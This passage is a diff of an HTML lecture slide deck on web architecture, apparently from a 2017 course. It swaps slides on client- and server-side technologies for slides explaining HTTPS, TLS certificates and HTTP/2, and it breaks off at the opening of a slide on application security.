@@ -127,7 +127,7 @@
     <ul>
       <li><a href="#core">Core Web Standards</a></li>
       <li><a href="#architecture">Web Architecture</a></li>
-      <li><a href="#supporting-technologies">Supporting Technologies</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
@@ -147,7 +147,7 @@
         </ul>
       </li>
       <li><a href="#architecture">Web Architecture</a></li>
-      <li><a href="#supporting-technologies">Supporting Technologies</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
@@ -434,7 +434,7 @@
         </ul>
       </li>
       <li><a href="#architecture">Web Architecture</a></li>
-      <li><a href="#supporting-technologies">Supporting Technologies</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
@@ -758,7 +758,7 @@ Last-Modified: Sun, 24 Jan 2016 18:26:27 GMT</span>
         </ul>
       </li>
       <li><a href="#architecture">Web Architecture</a></li>
-      <li><a href="#supporting-technologies">Supporting Technologies</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
@@ -936,7 +936,7 @@ Last-Modified: Sun, 24 Jan 2016 18:26:27 GMT</span>
           <li><a href="#intermediaries">Intermediaries</a></li>
         </ul>
       </li>
-      <li><a href="#supporting-technologies">Supporting Technologies</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
@@ -1064,7 +1064,7 @@ Last-Modified: Sun, 24 Jan 2016 18:26:27 GMT</span>
         They use their own infrastructure,<br>
         as they don’t have the browser’s.
         <ul>
-          <li class="next">In particular, they usually don’t set <a href="#cookies">cookies</a>.</li>
+          <li class="next">In particular, they usually don’t set cookies.</li>
         </ul>
       </li>
       <li class="next">
@@ -1127,7 +1127,7 @@ Last-Modified: Sun, 24 Jan 2016 18:26:27 GMT</span>
           <li><a href="#intermediaries">Intermediaries</a></li>
         </ul>
       </li>
-      <li><a href="#supporting-technologies">Supporting Technologies</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
@@ -1316,7 +1316,7 @@ Last-Modified: Sun, 24 Jan 2016 18:26:27 GMT</span>
           <li class="current"><a href="#intermediaries">Intermediaries</a></li>
         </ul>
       </li>
-      <li><a href="#supporting-technologies">Supporting Technologies</a></li>
+      <li><a href="#beyond-the-core">Beyond the Core</a></li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
@@ -1466,7 +1466,7 @@ removeObject.deleteMessage(234);</code></pre>
     <object data="images/client-server.svg">Diagram showing an intermediary in the role of both client and server.</object>
   </div>
 
-  <div class="toc slide" id="supporting-technologies">
+  <div class="toc slide" id="beyond-the-core">
     <h2>
       <a class="series" href="../">Web Fundamentals</a><br>
       <a class="module" href="#title">Web Architecture &amp; Technologies</a>
@@ -1475,572 +1475,362 @@ removeObject.deleteMessage(234);</code></pre>
       <li><a href="#core">Core Web Standards</a></li>
       <li><a href="#architecture">Web Architecture</a></li>
       <li class="current">
-        <a href="#supporting-technologies">Supporting Technologies</a>
+        <a href="#beyond-the-core">Beyond the Core</a>
         <ul>
-          <li class="current"><a href="#supporting-technologies">Client-side Technologies</a></li>
-          <li><a href="#server-side">Server-side Technologies</a></li>
-          <li><a href="#security">Security Considerations</a></li>
+          <li class="current"><a href="#beyond-the-core">HTTPS</a></li>
+          <li><a href="#http2">HTTP/2</a></li>
+          <li><a href="#security">Security</a></li>
         </ul>
       </li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
 
-  <div class="slide" id="cookies">
+  <div class="slide" id="http-insecure">
     <h2>
-      <a href="https://tools.ietf.org/html/rfc6265">Cookies</a> allow preserving information<br>
-      across different HTTP requests.
+      HTTP nodes send plaintext over TCP,<br>
+      which means intermediaries can read it.
     </h2>
     <ul>
-      <li>
-        By design, HTTP is a stateless protocol.
-        <ul>
-          <li>This leads to <a href="#transparency">scalability benefits</a>.</li>
-        </ul>
-      </li>
-      <li class="next">
-        A cookie is a key/value string set by the server and<br>
-        transmitted by the client on subsequent requests.
-        <ul>
-          <li>The server adds a <a href="https://tools.ietf.org/html/rfc6265#section-4.1"><code>Set-Cookie</code></a> header to responses.</li>
-          <li>The client mirrors its value in a <a href="https://tools.ietf.org/html/rfc6265#section-4.1"><code>Cookie</code></a> request header.</li>
-        </ul>
-      </li>
-      <li class="next">
-        Servers can identify clients and store preferences.
-        <ul>
-          <li class="opinion">
-            The <a href="http://ec.europa.eu/ipg/basics/legal/cookies/index_en.htm">EU “cookie law”</a>:
-            a cure worse than the disease?
-          </li>
-        </ul>
-      </li>
+      <li class="next">The privacy of your <em>requests</em> is not guaranteed.</li>
+      <li class="next">The privacy of server <em>responses</em> is not guaranteed.</li>
+      <li class="next">The <em>integrity</em> of server responses is not guaranteed.</li>
     </ul>
   </div>
 
-  <div class="slide" id="css">
+  <div class="slide" id="http-threats">
     <h2>
-      Cascading Style Sheets state declaratively<br>
-      what elements should look like.
+      The Web needs to be a safe<br>
+      and trusted environment for all.
     </h2>
     <ul>
       <li>
-        A CSS document consists of <em>rules</em>,<br>
-        which can be grouped in scopes.
-      </li>
-      <li>
-        A rule starts with a <a href="https://www.w3.org/TR/selectors/">selector</a> indicating<br>
-        to which element(s) the rule applies.
-      </li>
-      <li>
-        The rule body consists of key/value pairs<br>
-        of a <a href="https://www.w3.org/Style/CSS/all-properties.en.html">property</a> name and its desired setting.
-      </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="css-selectors">
-    <h2>
-      CSS selectors pinpoint elements<br>
-      based on characteristics and hierarchy.
-    </h2>
-    <dl>
-      <dt><a href="https://www.w3.org/TR/selectors/#type-selectors">h1</a></dt>
-      <dd>tag name</dd>
-      <dt><a href="https://www.w3.org/TR/selectors/#id-selectors">#index</a></dt>
-      <dd>identifier (<code>id</code> attribute value)</dd>
-      <dt><a href="https://www.w3.org/TR/selectors/#class-html">.person</a></dt>
-      <dd>class name (<code>class</code> attribute value)</dd>
-      <dt><a href="https://www.w3.org/TR/selectors/#pseudo-classes">:visited</a></dt>
-      <dd>state, position, …</dd>
-      <dt><a href="https://www.w3.org/TR/selectors/#attribute-selectors">[type=submit]</a></dt>
-      <dd>attribute value</dd>
-    </dl>
-  </div>
-
-  <div class="slide" id="css-combinators">
-    <h2>
-      CSS selectors can be arranged<br>
-      into combinations.
-    </h2>
-    <dl>
-      <dt><a href="https://www.w3.org/TR/selectors/#descendant-combinators">header a</a></dt>
-      <dd>descendants (children, grandchildren, …)</dd>
-      <dt><a href="https://www.w3.org/TR/selectors/#descendant-combinators">ul > li</a></dt>
-      <dd>direct children</dd>
-      <dt><a href="https://www.w3.org/TR/selectors/#grouping">p, td, th</a></dt>
-      <dd>multiple selectors <em>(OR)</em></dd>
-      <dt><a href="https://www.w3.org/TR/selectors/#selectors">a.info:visited</a></dt>
-      <dd>multiple conditions <em>(AND)</em></dd>
-    </dl>
-  </div>
-
-  <div class="slide" id="css-inheritance">
-    <h2>
-      Elements <em>inherit</em> (some) properties<br>
-      from parent elements and other rules.
-    </h2>
-    <pre><code><strong>#css-test</strong> {
-  font-style: italic;
-  text-align: center;
-  border: 3px solid #4B86C2;
-}
-<strong>#css-test span</strong> { border: 3px solid #CC4320; }
-<strong>#css-test span:last-child</strong> { background-color: #979A9E; }</code></pre>
-    <div id="css-test">
-      <span>first</span>
-      <span>second</span>
-    </div>
-  </div>
-
-  <div class="slide" id="responsive-design">
-    <h2>
-      Applying CSS rules only to certain displays<br>
-      allows for <em>responsive design</em>.
-    </h2>
-    <ul>
-      <li>
-        <a href="https://developer.mozilla.org/en-US/docs/Web/CSS/Media_Queries/Using_media_queries">CSS media queries</a>
-        define on which displays<br>
-        a set of rules should be applied.
-        <ul>
-          <li><code>@media print { /* CSS rules */ }</code></li>
-          <li><code>@media screen and (max-width: 800px) { }</code></li>
-          <li><code>@media screen and (min-width: 1000px) { }</code></li>
-        </ul>
-      </li>
-      <li class="next">
-        Responsive: <em>one</em> HTML version<br>
-        can support <em>multiple</em> devices.
-        <ul>
-          <li class="next opinion">We don’t need dedicated mobile sites.</li>
-          <li class="next opinion">We don’t need dedicated mobile apps.</li>
-        </ul>
-      </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="web-fonts">
-    <h2>
-      Web Fonts allow webpages<br>
-      to use non-system fonts.
-    </h2>
-    <ul>
-      <li>
-        It took a relatively long time for fonts<br>
-        to become first-class Web citizens.
-        <ul>
-          <li>Many sites used to stick to widely installed fonts.</li>
-          <li>Some typeset titles using images or Flash movies.</li>
-        </ul>
-      </li>
-      <li>
-        The <a href="https://www.w3.org/TR/WOFF/">Web Open Font Format</a>
-        is standardized by W3C.
-      </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="javascript">
-    <h2>
-      JavaScript is a programming language<br>
-      supported by many browsers.
-    </h2>
-    <ul>
-      <li>
-        very expressive, dynamic, multi-paradigm language
+        HTTP poses a major threat
+        for sensitive applications.
         <ul class="inline">
-          <li>prototypal inheritance</li>
-          <li>functions as first-class citizens</li>
+          <li>banking</li>
+          <li>payment</li>
+          <li>medical records</li>
+          <li>webmail</li>
           <li>…</li>
         </ul>
       </li>
-      <li>
-        supported by several highly optimized engines
-        <ul class="inline">
-          <li>Google’s <a href="https://developers.google.com/v8/">V8</a></li>
-          <li>Mozilla’s <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey">SpiderMonkey</a></li>
-        </ul>
-      </li>
-      <li>
-        <a href="http://javascript.crockford.com/javascript.html">“most misunderstood programming language”</a>
+      <li class="next">
+        It’s hard to define what is <em>sensitive</em>.
         <ul>
-          <li>nothing to do with Java</li>
+          <li class="next">Can others see what Wikipedia articles you read?</li>
         </ul>
       </li>
     </ul>
   </div>
 
-  <div class="slide" id="javascript-events">
+  <div class="slide" id="https">
     <h2>
-      In the browser, JavaScript is often<br>
-      used in an event-driven manner.
+      <a href="https://tools.ietf.org/html/rfc2818">HTTPS</a> is a secure extension<br>
+      of the HTTP protocol.
     </h2>
-    <pre><code>var input = document.getElementById('text'),
-    display = document.getElementById('length');
-input.onkeyup = function () {
-  display.innerText = input.value.length;
-}</code></pre>
+    <ul>
+      <li>
+        <a href="https://tools.ietf.org/html/rfc2818#section-2">Simply use HTTP over TLS</a> precisely<br>
+        as you would use HTTP over TCP.
+      </li>
+      <li class="next">
+        <a href="https://tools.ietf.org/html/rfc2246">Transport Layer Security (TLS)</a>
+        is a cryptographic protocol for Internet communication.
+        <ul>
+          <li>TLS succeeded <a href="https://tools.ietf.org/html/rfc6101">Secure Sockets Layer (SSL)</a>.</li>
+          <li>TLS is still frequently referred to as “SSL”.</li>
+        </ul>
+      </li>
+      <li class="next">
+        TLS relies on asymmetric encryption.
+        <ul>
+          <li>private and public keys</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https-where">
+    <h2>
+      HTTPS can be applied in<br>
+      different parts of the network.
+    </h2>
     <p>
-      <input id="text" />
-      <span id="length"></span>
+      Consider the common use case in which<br>
+      an <strong>application server</strong> lives behind a <strong>reverse proxy</strong>.
+    </p>
+    <ul>
+      <li class="next">
+        Only the proxy could use HTTPS.
+        <ul>
+          <li>Typically, server and proxy operate in a trusted network.</li>
+          <li>Client–proxy communications are secured.</li>
+        </ul>
+      </li>
+      <li class="next">
+        The server <em>and</em> the proxy could use HTTPS.
+        <ul>
+          <li>These are two <em>different</em> encrypted communications.</li>
+          <li>No proxy can sit “in between” an encrypted communication.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https-how">
+    <h2>
+      Setting up HTTPS involves requesting,<br>
+      installing, and maintaining a certificate.
+    </h2>
+    <ul>
+      <li class="next">
+        Request SSL certificate from a <em>certificate authority</em>.
+        <ul>
+          <li>This certificate is valid for one or more hostnames.</li>
+          <li><a href="https://letsencrypt.org/">Let's Encrypt</a> provides free certificates for all.</li>
+        </ul>
+      </li>
+      <li class="next">
+        Configure your Web server with the certificate.
+        <ul>
+          <li>private key stored safely</li>
+          <li>public key shared with clients</li>
+        </ul>
+      </li>
+      <li class="next">
+        When the certificate expires, request a new one.
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https-urls">
+    <h2>
+      HTTPS URLs are different,<br>
+      so clients know what protocol to use.
+    </h2>
+    <ul>
+      <li>
+        HTTP URLs start with <code>http:</code><br>
+        HTTPS URLs start with <code>https:</code>
+      </li>
+      <li class="next">
+        After HTTPS has been configured,<br>
+        server admins typically set up redirects.
+        <ul>
+          <li>Never break existing URLs!</li>
+        </ul>
+      </li>
+      <li class="next">
+        The connection between two URLS differing only
+        in <code>http</code>/<code>https</code> is <em>not</em> universally defined.
+        <ul>
+          <li>They <em>could</em> be different things.</li>
+        </ul>
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="https-ui">
+    <h2>
+      <a href="https://noncombatant.org/2017/02/15/decoding-chromes-https-ux/">Informing users about security in the UI</a><br>
+      is an important part of a safer Web.
+    </h2>
+    <p>
+      Most browsers indicate HTTPS in the address bar.
+    </p>
+    <img src="images/https-secure.png" class="center" alt="[“Secure” indication in the address bar]">
+  </div>
+
+  <div class="slide" id="https-default">
+    <h2>
+      Some browsers such as Chrome<br>
+      <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">campaign</a> for an all-HTTPS Web.
+    </h2>
+    <img src="images/chrome-http.png" alt="[current treatment of regular HTTP pages in Chrome]">
+    <img src="images/chrome-http-future.png" class="next" alt="[future treatment of regular HTTP pages in Chrome]">
+  </div>
+
+  <div class="toc slide" id="http2">
+    <h2>
+      <a class="series" href="../">Web Fundamentals</a><br>
+      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+    </h2>
+    <ul>
+      <li><a href="#core">Core Web Standards</a></li>
+      <li><a href="#architecture">Web Architecture</a></li>
+      <li class="current">
+        <a href="#beyond-the-core">Beyond the Core</a>
+        <ul>
+          <li><a href="#beyond-the-core">HTTPS</a></li>
+          <li class="current"><a href="#http2">HTTP/2</a></li>
+          <li><a href="#security">Security</a></li>
+        </ul>
+      </li>
+    </ul>
+    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
+  </div>
+
+  <div class="slide" id="http2-necessity">
+    <h2>
+      The Web has been pushing HTTP’s limits,<br>
+      so an update was due.
+    </h2>
+    <ul>
+      <li class="next">
+        The Web has <a href="#webpage-size">different demands</a> nowadays<br>
+        than those initially envisaged.
+      </li>
+      <li class="next">
+        HTTP/2 is an update of the HTTP protocol<br>
+        that addresses a couple of key bottlenecks.
+      </li>
+    </ul>
+    <p>
+      This section is based on <a href="https://http2-explained.haxx.se/content/en/"><em>http2 explained</em></a><br>
+      by <a href="https://daniel.haxx.se/">Daniel Stenberg</a>,
+      creator of <a href="https://curl.haxx.se/">curl</a>.
     </p>
   </div>
-  <script>
-    var input = document.getElementById('text'),
-        display = document.getElementById('length');
-    input.onkeyup = function () {
-      display.innerText = input.value.length;
-    }
-  </script>
 
-  <div class="slide" id="unobtrusive-javascript">
+  <div class="slide" id="webpage-size">
     <h2>
-      Practice <a href="https://www.w3.org/wiki/The_principles_of_unobtrusive_JavaScript">unobtrusive JavaScript</a><br>
-      to ensure sites also work without scripts.
+      Webpages consist of more and more items<br>
+      that increasingly become larger.
     </h2>
     <ul>
-      <li>
-        Client-side scripts should provide enhancements,<br>
-        not essential functionality, whenever possible.
+      <li class="next">
+        The <a href="http://httparchive.org/">HTTP Archive</a>
+        saw average total page transfer size increase
+        from 0.7Mb in 2010 to 2.35Mb in 2017.
+      </li>
+      <li class="next">
+        The average page consist of more than 90 objects.
+      </li>
+    </ul>
+  </div>
+
+  <div class="slide" id="http-limitations">
+    <h2>
+      Several limitations of HTTP have<br>
+      a negative impact on page load times.
+    </h2>
+    <ul>
+      <li class="next">
+        <a href="https://http2-explained.haxx.se/content/en/part2.html#23-inadequate-use-of-tcp">TCP connections are not used optimally.</a>
         <ul>
-          <li class="next">Not all browsers support JavaScript.</li>
-          <li class="next">Not all browsers support JavaScript consistently.</li>
-          <li class="next">Trust default interactions over your own.</li>
+          <li>Connections are costly due to the three-way handshake.</li>
+          <li>Limit the connections per host to avoid exhaustion.</li>
         </ul>
       </li>
       <li class="next">
-        This is a <a href="http://alistapart.com/article/understandingprogressiveenhancement">progressive enhancement</a> technique.
-        <ul>
-          <li class="next">
-            Its goals are similar to <em>graceful degradation</em>,<br>
-            but progressive enhancement starts from simple clients.
-          </li>
-        </ul>
+        <a href="https://http2-explained.haxx.se/content/en/part2.html#25-latency-kills">HTTP is very latency-sensitive.</a>
       </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="html5-apis">
-    <h2>
-      The <a href="https://www.w3.org/TR/html5/">HTML5 specification</a> includes<br>
-      several APIs for JavaScript.
-    </h2>
-    <ul>
-      <li>
-        <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model">Document Object Model</a>
-        <ul>
-          <li>Traverse, observe, and manipulate elements.</li>
-        </ul>
-      </li>
-      <li>
-        <a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">Canvas</a>
-        <ul>
-          <li>Draw graphics using bitmap operations.</li>
-        </ul>
-      </li>
-      <li>
-        <a href="https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API">Web Storage</a>
-        <ul>
-          <li>Save key/value pairs per website.</li>
-        </ul>
-      </li>
-      <li>
-        …
-      </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="json">
-    <h2>
-      JSON is a lightweight representation<br>
-      for data on (and beyond) the Web.
-    </h2>
-    <ul>
-      <li>
-        JSON serializes a subset of JavaScript values.
-        <ul class="inline">
-          <li>key/value objects, strings, booleans, numbers, arrays</li>
-        </ul>
-      </li>
-      <li>
-        JSON documents can be read natively in JavaScript,<br>
-        but libraries for many other languages exist.
-      </li>
-    </ul>
-    <pre><code>{
-  "title": "Hall of fame",
-  "people": [{ "name": "Douglas" }, { "name": "Brendan" }]
-}</code></pre>
-  </div>
-
-  <div class="slide" id="xml">
-    <h2>
-      XML is a popular data model and format<br>
-      that uses an element-based hierarchy.
-    </h2>
-    <ul>
-      <li>
-        The structure of HTML is similar to XML.
-        <ul>
-          <li>In fact, <a href="https://www.w3.org/TR/html5/the-xhtml-syntax.html">some HTML documents</a> are XML documents.</li>
-        </ul>
-      </li>
-      <li>
-        XML has stricter structural constraints than HTML.
-        <ul>
-          <li>valid nesting</li>
-          <li>all tags must be closed</li>
-          <li>attributes must be quoted and have a value</li>
-          <li>…</li>
-        </ul>
-      </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="xml-verbosity">
-    <h2 class="opinion">
-      Because of the strong form requirements,<br>
-      XML documents tend to be verbose.
-    </h2>
-    <pre><code><em>&lt;?xml version="1.0" encoding="UTF-8"?&gt;</em>
-&lt;list&gt;
-  &lt;title&gt;Hall of fame&lt;/title&gt;
-  &lt;people&gt;
-    &lt;person name="Douglas" /&gt;
-    &lt;person name="Brendan" /&gt;
-  &lt;/people&gt;
-&lt;/list&gt;</code></pre>
-  </div>
-
-  <div class="slide" id="web-feeds">
-    <h2>
-      Web feeds are documents that<br>
-      signal when new content is available.
-    </h2>
-    <ul>
-      <li>
-        They contain a list of (summarized) items.
+      <li class="next">
+        <a href="https://http2-explained.haxx.se/content/en/part2.html#26-head-of-line-blocking">Sequential handling of requests blocks pipelines.</a>
         <ul>
           <li>
-            Typically with attributes such as
-            <ul class="inline">
-              <li>title</li>
-              <li>link</li>
-              <li>summary</li>
-              <li>…</li>
-            </ul>
+            <em>HTTP pipelining</em> allows issuing multiple requests on a single TCP connection
+            without waiting for responses to arrive.
           </li>
         </ul>
       </li>
-      <li>
-        The client <em>polls</em> regularly to check for new items.
-      </li>
-      <li>
-        Two variants exist:
-        <a href="http://cyber.law.harvard.edu/rss/rss.html">RSS</a>
-        and
-        <a href="https://tools.ietf.org/html/rfc4287">Atom</a>.
-      </li>
-      <li class="next opinion">
-        Social media streams seem to<br>
-        have pushed feeds to the background.
-      </li>
     </ul>
   </div>
 
-  <div class="slide" id="web-feeds-example">
+  <div class="slide" id="http-workarounds">
     <h2>
-      Web feeds are documents that<br>
-      signal when new content is available.
+      Many websites use(d) workarounds<br>
+      to circumvent HTTP’s limitations.
     </h2>
-
-    <pre><code>&lt;feed xmlns="http://www.w3.org/2005/Atom"&gt;
-  &lt;title&gt;Ruben Verborgh’s blog&lt;/title&gt;
-  &lt;link rel="self" href="<a href="https://ruben.verborgh.org/blog/latest.xml">https://ruben.verborgh.org/blog/latest.xml</a>"/&gt;
-  &lt;entry&gt;
-    &lt;title&gt;Turtles all the way down&lt;/title&gt;
-    &lt;published&gt;2015-10-06T12:00:00Z&lt;/published&gt;
-    &lt;link rel="alternate" href="<a href="https://ruben.verborgh.org/blog/latest.xml">https://ruben.verborgh.org/blog/2015/10/06/turtles-all-the-way-down/</a>"/&gt;
-  &lt;/entry&gt;
-&lt;/feed&gt;</code></pre>
+    <dl>
+      <dt><a href="https://http2-explained.haxx.se/content/en/part3.html#32-inlining">inlining</a></dt>
+      <dd class="next">
+        Embed scripts, images, and/or styles
+        inside HTML documents instead of linking them
+        to reduce the number of items.
+      </dd>
+      <dt><a href="https://http2-explained.haxx.se/content/en/part3.html#33-concatenation">concatenation</a></dt>
+      <dd class="next">
+        Combine several scripts, images, or styles
+        into a single file.
+      </dd>
+      <dt><a href="https://http2-explained.haxx.se/content/en/part3.html#34-sharding">sharding</a></dt>
+      <dd class="next">
+        Distribute resources across different domains
+        to bypass connection restrictions.
+      <dd>
+    </dl>
   </div>
 
-  <div class="toc slide" id="server-side">
+  <div class="slide" id="http2-goals">
     <h2>
-      <a class="series" href="../">Web Fundamentals</a><br>
-      <a class="module" href="#title">Web Architecture &amp; Technologies</a>
+      HTTP/2 set out a couple of<br>
+      important <a href="https://http2-explained.haxx.se/content/en/part4.html">goals</a> for improvement.
     </h2>
     <ul>
-      <li><a href="#core">Core Web Standards</a></li>
-      <li><a href="#architecture">Web Architecture</a></li>
-      <li class="current">
-        <a href="#supporting-technologies">Supporting Technologies</a>
-        <ul>
-          <li><a href="#supporting-technologies">Client-side Technologies</a></li>
-          <li class="current"><a href="#server-side">Server-side Technologies</a></li>
-          <li><a href="#security">Security Considerations</a></li>
-        </ul>
-      </li>
+      <li>Reduce sensitivity to latency.</li>
+      <li>Eliminate the need for multiple connections.</li>
+      <li>Fix HTTP pipelining and line blocking.</li>
+      <li>Maintain interfaces, content, and URLs.</li>
+      <li>Be backward compatible for HTTP 1.1 clients.</li>
     </ul>
-    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
 
-  <div class="slide" id="server-script">
+  <div class="slide" id="http2-protocol">
     <h2>
-      A server can react to HTTP requests<br>
-      by executing a program or script.
+      HTTP/2 is a binary protocol that sends<br>
+      frames over multiplexed streams.
     </h2>
     <ul>
-      <li>
-        Web frameworks abstract HTTP functionality,<br>
-        in different kinds of ways.
+      <li class="next">
+        Switching to <a href="https://http2-explained.haxx.se/content/en/part6.html#61-binary">binary</a> makes framing easier.
         <ul>
-          <li class="next">event-based access to request object <em>(Node.js)</em></li>
-          <li class="next">classes handling specific requests <em>(Java servlets)</em></li>
-          <li class="next">model-view-controller pattern <em>(Ruby on Rails)</em></li>
+          <li>10 types of frames</li>
+          <li><code>HEADERS</code> frame for HTTP headers</li>
+          <li><code>DATA</code> for request and response payloads</li>
         </ul>
       </li>
       <li class="next">
-        In older frameworks, the URL identifies a script.
+        <a href="https://http2-explained.haxx.se/content/en/part6.html#63-multiplexed-streams">Multiplexing</a> ensures objects don’t block each other.
         <ul>
-          <li><em>http://example.org/app/executeOrder<strong>.php</strong>?id=35</em></li>
+          <li>Frames from many streams flow over the same connection.</li>
         </ul>
       </li>
       <li class="next">
-        Newer frameworks provide independent URLs.
-      </li>
-    </ul>
-    <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
-  </div>
-
-  <div class="slide" id="php">
-    <h2>
-      PHP is a scripting language<br>
-      used to create dynamic pages.
-    </h2>
-    <ul>
-      <li>
-        Special tag-like structures indicate<br>
-        where PHP code begins.
-      </li>
-      <li>
-        Several frameworks allow higher-level development.
-        <ul class="inline">
-          <li><a href="https://laravel.com/">Laravel</a></li>
-          <li><a href="http://cakephp.org/">CakePHP</a></li>
-          <li><a href="https://symfony.com/">Symphony</a></li>
-          <li>…</li>
-        </ul>
-      </li>
-    </ul>
-    <pre><code>&lt;tr&gt;
-  &lt;th&gt;Order total (VAT included):&lt;/th&gt;
-  &lt;td&gt;EUR <strong>&lt;?php echo 1.21 * $price; ?&gt;</strong>&lt;/td&gt;
-&lt;/tr&gt;</code></pre>
-  </div>
-
-  <div class="slide" id="ruby-on-rails">
-    <h2>
-      Ruby on Rails is a framework<br>
-      to create Web applications.
-    </h2>
-    <ul>
-      <li>
-        Rails follows the model-view-controller pattern.
+        <a href="https://http2-explained.haxx.se/content/en/part6.html#65-header-compression">Additional compression</a> reduces overhead.
         <ul>
-          <li>Model instances are stored in a database.</li>
-          <li>A view represents model instances as HTML, JSON, …</li>
-          <li>A controller performs model actions and instantiates views.</li>
-        </ul>
-      </li>
-      <li>
-        Views are typically based on templates,<br>
-        which can contain Ruby expressions.
-      </li>
-      <li>
-        Routers tie URL patterns to controllers.
-      </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="aspnet">
-    <h2>
-      ASP.NET combines compiled code<br>
-      with declarative annotations.
-    </h2>
-    <ul>
-      <li>
-        Any of the .NET languages can be used.
-        <ul>
-          <li>compiled into <a href="https://msdn.microsoft.com/en-us/library/k3677y81(v=vs.90).aspx">.NET assemblies</a></li>
-        </ul>
-      </li>
-      <li>
-        The original ASP.NET defined <a href="http://www.asp.net/web-forms">Web Forms</a>,<br>
-        treating a page’s elements as <em>server-side</em> objects.
-        <ul>
-          <li>very tight client-server coupling</li>
-        </ul>
-      </li>
-      <li>
-        ASP.NET MVC adopts model-view-controller.
-      </li>
-    </ul>
-  </div>
-
-  <div class="slide" id="nodejs">
-    <h2>
-      Node.js brings the JavaScript language<br>
-      also to the server side.
-    </h2>
-    <ul>
-      <li>
-        Node.js bundles the V8 engine with <a href="https://nodejs.org/api/">low-level APIs</a>.
-        <ul>
-          <li>Google’s V8 engine made JavaScript fast in browsers.</li>
-        </ul>
-      </li>
-      <li>
-        It adopts the model of an event machine:<br>
-        a single thread reacting to events.
-        <ul>
-          <li>never actively wait: IO operations happen asynchronously</li>
-          <li>encouraged by JavaScript’s first-class functions</li>
-        </ul>
-      </li>
-      <li>
-        Other applications can also be developed.
-        <ul>
-          <li>not necessarily HTTP servers</li>
+          <li>HTTP’s stateless nature implies repetition.</li>
         </ul>
       </li>
     </ul>
   </div>
 
-  <div class="slide" id="isomorphic-javascript">
+  <div class="slide" id="http2-tls">
     <h2>
-      <a href="http://isomorphic.net/">Isomorphic JavaScript</a> applications use<br>
-      the same language on clients &amp; servers.
+      HTTP/2 always goes over TLS in practice,<br>
+      even though the standard also allows TCP.<br>
     </h2>
     <ul>
-      <li>
-        If the client and server speak the same language,<br>
-        we only need to develop code once.
+      <li class="next">
+        With regular TCP on port 80, clients would<br>
+        need to upgrade from HTTP 1.x to HTTP/2.
         <ul>
-          <li>
-            PHP sites need another language on the server,<br>
-            so sometimes code is implemented twice.
-          </li>
+          <li>overhead necessary for backward compatibility</li>
         </ul>
       </li>
       <li class="next">
-        The code to render pages runs on the server<br>
-        when creating the initial page.
+        With TLS, <a href="https://tools.ietf.org/html/rfc7301">Application-Layer Protocol Negotiation</a>
+        is embedded within the TLS handshake.
+        <ul>
+          <li>no protocol selection latency</li>
+        </ul>
       </li>
       <li class="next">
-        The <em>same</em> code can update the page on the client,<br>
-        instead of fetching a complete page again.
+        Firefox and Chrome will only support TLS.
+        <ul>
+          <li><code>https:</code> everywhere in the future</li>
+        </ul>
       </li>
     </ul>
   </div>
@@ -2054,131 +1844,108 @@ input.onkeyup = function () {
       <li><a href="#core">Core Web Standards</a></li>
       <li><a href="#architecture">Web Architecture</a></li>
       <li class="current">
-        <a href="#supporting-technologies">Supporting Technologies</a>
+        <a href="#beyond-the-core">Beyond the Core</a>
         <ul>
-          <li><a href="#supporting-technologies">Client-side Technologies</a></li>
-          <li><a href="#server-side">Server-side Technologies</a></li>
-          <li class="current"><a href="#security">Security Considerations</a></li>
+          <li><a href="#beyond-the-core">HTTPS</a></li>
+          <li><a href="#http2">HTTP/2</a></li>
+          <li class="current"><a href="#security">Security</a></li>
         </ul>
       </li>
     </ul>
     <p class="tweets"><a href="https://twitter.com/search?f=tweets&amp;q=%23WebDev2017">#WebDev2017</a></p>
   </div>
 
-  <div class="slide" id="same-origin">
+  <div class="slide" id="application-security">
     <h2>
-      Browser scripts can only request<br>
-      resources from the same origin.
+      Protocol-level security is insufficient<br>
+      to provide application-level security.
